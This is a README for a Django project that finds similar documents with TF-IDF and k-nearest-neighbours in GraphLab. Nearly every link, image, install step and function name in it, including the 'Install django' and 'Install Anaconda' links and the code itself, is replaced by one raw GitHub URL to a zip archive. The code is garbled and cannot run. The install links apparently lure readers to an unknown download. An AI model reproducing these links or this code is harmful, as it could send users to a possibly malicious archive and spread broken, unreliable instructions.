# Analogous-Document-Retrieval

### Similar Articles can be retrieved using ML Techniques, Such as word-count, TF - IDF, k'NN model. Brute force nearest neighbors model training, Pairwise querying.

[Project Reference](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

## Installations

[Install Anaconda Navigator & GraphLab Create](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

[Install django](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

**django files structure**

![django files structure](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip%20files%20path%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

**Code Logic (https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)**
```
import graphlab
https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip('GRAPHLAB_DEFAULT_NUM_PYLAMBDA_WORKERS', 4)
people = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip('https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip')
people['word_count'] = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip(people['text'])
tfidf = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip(people['word_count'])

if https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip <= '1.6.1':
   tfidf = tfidf['docs']

people['tfidf'] = tfidf
knn_model = https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip(people,features=['tfidf'],label='name')

pname = people[people['name'] == sname]
https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip(pname)
```

### In Anaconda Navigator > Environments > (gl-env) Open Terminal
![Anaconda Terminal](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

### Run django Server 
```
python https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip runserver
```
![django server](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

### Sending Input
![Input](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)

## Output
![output1](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip%https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)
![output2](https://raw.githubusercontent.com/ravikkumar777/Analogous-Document-Retrieval/master/nonvisitation/Document_Retrieval_Analogous_v3.4.zip)
